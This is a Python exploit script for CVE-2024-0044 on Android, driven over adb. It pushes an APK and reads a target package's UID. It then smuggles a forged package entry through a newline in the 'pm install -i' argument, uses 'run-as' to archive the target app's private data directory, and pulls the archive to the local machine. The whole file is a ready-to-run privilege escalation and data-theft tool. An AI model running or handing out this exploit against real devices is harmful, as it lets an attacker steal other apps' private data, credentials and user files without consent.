#!/usr/bin/env python3
import argparse, os, signal, subprocess, sys

# variables
args = None
uid = None
REMOTE_DIRECTORY_PATH = "/data/local/tmp/"
TIMEOUT_PROCESS = 5

# Ctrl+C
def handlerCrtlC(sig, frame):
    messages.warning("Exit...", True)
signal.signal(signal.SIGINT, handlerCrtlC)

# color class
class color:
   BLUE = "\033[0;34;48m"
   CYAN = "\033[0;36;48m"
   GREEN = "\033[0;32;48m"   
   YELLOW = "\033[0;33;48m"
   RED = "\033[0;31;48m"
   WHITE = "\033[0;37m"
   END = "\033[0;37;0m"

# messages class
class messages:
    def exit_program(exit):
        if exit:
            sys.exit()

    def success(message, exit=False):
        print(color.GREEN + "[i] " + message + color.END)
        messages.exit_program(exit)

    def warning(message, exit=False):
        print(color.YELLOW + "[!] " + message + color.END)
        messages.exit_program(exit)

    def error(message, exit=False):
        print(color.RED + "[x] " + message + color.END)
        messages.exit_program(exit)

    def value_square_parentheses(value, color_value=color.CYAN):
        return color.WHITE + "[" + color.END + color_value + value + color.END + color.WHITE + "]" + color.END    

# argument parser
def argument_parser():
    global args

    # argument parser configuration
    parser = argparse.ArgumentParser(
        usage="%(prog)s -p <target package name> -a <any app (apk)>",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="""examples:
        ./%(prog)s -p target.package.name -a any-app.apk
        ./%(prog)s --package-name target.package.name --apk any-app.apk""",
        epilog=""
    )
    parser.add_argument("-p", "--package-name", action="store", help="Target package name", dest="target_package_name", type=str)
    parser.add_argument("-a", "--apk", action="store", help="Any app (apk)", dest="apk_file_path", type=str)
    parser.add_argument("-V", "--version", action="version", version="Version: 0.2 by MrW0l05zyn")

    # reading arguments
    args = parser.parse_args()

    # argument input validation
    if not args.target_package_name or not args.apk_file_path:
        parser.print_help()
        messages.exit_program(True)    

# push APK
def push_apk(apk_file_path):
    try:
        # APK file extension
        if not apk_file_path.endswith('.apk'):
            messages.warning("Wrong APK file extension", True)
            return False

        if not os.path.isfile(apk_file_path):
            messages.warning(f"APK file '{apk_file_path}' does not exist", True)
            return False

        result = subprocess.run(['adb', 'push', apk_file_path, REMOTE_DIRECTORY_PATH], timeout=TIMEOUT_PROCESS, capture_output=True, text=True)
        if result.returncode != 0:
            messages.error(f"Failed to push APK ({apk_file_path})", True)
            return False

        return True

    except Exception as e:
        messages.error(str(e), True)

# get APP UID
def get_app_uid(target_package_name):
    try:
        global uid

        result = subprocess.run(['adb', 'shell', f'pm list packages -U | sed -n "s/^package:{target_package_name} uid://p"'], timeout=TIMEOUT_PROCESS, capture_output=True, text=True)
        if result.returncode != 0:
            messages.error(f"Could not find UID for the package {target_package_name}", True)
            return False

        uid = result.stdout.strip()
        if not uid:
            messages.warning(f"Could not find UID for the package {target_package_name}", True)
            return False
        else:
            return True

    except Exception as e:
        messages.error(str(e), True)

# exploit CVE-2024-0044
def cve_2024_0044(uid, apk_filename, target_package_name):
    try:
    
        messages.success("Running exploit CVE-2024-0044")
        proc = subprocess.Popen(['adb', 'shell'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        payload = f"PAYLOAD=\"@null\nvictim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"\npm install -i \"$PAYLOAD\" {REMOTE_DIRECTORY_PATH}{apk_filename}"
        commands = f"""rm -r {REMOTE_DIRECTORY_PATH}{target_package_name}
                    rm -r {REMOTE_DIRECTORY_PATH}{target_package_name}.tar
                    mkdir {REMOTE_DIRECTORY_PATH}{target_package_name}
                    touch {REMOTE_DIRECTORY_PATH}{target_package_name}/{target_package_name}.tar
                    chmod -R 0777 {REMOTE_DIRECTORY_PATH}{target_package_name}
                    {payload}
                    run-as victim
                    tar -cf {REMOTE_DIRECTORY_PATH}{target_package_name}/{target_package_name}.tar {target_package_name}
                    exit
                    mv {REMOTE_DIRECTORY_PATH}{target_package_name}/{target_package_name}.tar {REMOTE_DIRECTORY_PATH}
                    rm -r {REMOTE_DIRECTORY_PATH}{target_package_name}
                    exit"""
        stdout, stderr = proc.communicate(commands)
        return True

    except Exception as e:
        messages.error(str(e), True)

# get APP file
def get_app_file(target_package_name):
    try:
    
        messages.success("Copying application files from the mobile device to the local machine")
        result = subprocess.run(['adb', 'pull', f'{REMOTE_DIRECTORY_PATH}{target_package_name}.tar'], timeout=TIMEOUT_PROCESS, capture_output=True, text=True)

        if result.returncode != 0:
            messages.error(f"Error when copying application ({target_package_name}) files from mobile device to local machine", True)
            return False

        result = subprocess.run(['tar', '-xvf', f'{target_package_name}.tar'], timeout=TIMEOUT_PROCESS, capture_output=True, text=True)
        if result.returncode != 0:
            messages.error(f"Could not unzip {target_package_name}.tar", True)
            return False

        return True        

    except Exception as e:
        messages.error(str(e), True)

# main
if __name__ == "__main__":
    # argument parser
    argument_parser()

    # CVE-2024-0044
    print()

    # push APK
    if (push_apk(args.apk_file_path)):
        apk_filename = os.path.basename(args.apk_file_path)
        messages.success(f"APK pushed successfully {messages.value_square_parentheses(apk_filename)}")

        # get APP UID
        if get_app_uid(args.target_package_name):
            messages.success(f"UID of package {args.target_package_name} found {messages.value_square_parentheses(uid)}")

            # execution of exploit CVE-2024-0044
            if cve_2024_0044(uid, apk_filename, args.target_package_name):
                messages.success("Exploit CVE-2024-0044 executed successfully")

                # get APP file
                if get_app_file(args.target_package_name):
                    messages.success("Files copied successfully")                 